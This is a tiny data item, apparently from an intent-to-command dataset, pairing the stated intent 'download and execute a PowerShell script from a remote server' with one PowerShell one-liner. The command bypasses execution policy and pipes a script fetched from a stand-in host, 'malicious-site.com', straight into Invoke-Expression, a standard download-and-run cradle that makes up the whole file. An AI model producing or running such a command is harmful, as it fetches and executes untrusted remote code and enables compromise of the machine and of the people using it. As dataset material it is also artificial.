# Natural language intent:
# Download and execute a PowerShell script from a remote server using the -c flag.

powershell -ep bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-script.ps1')"
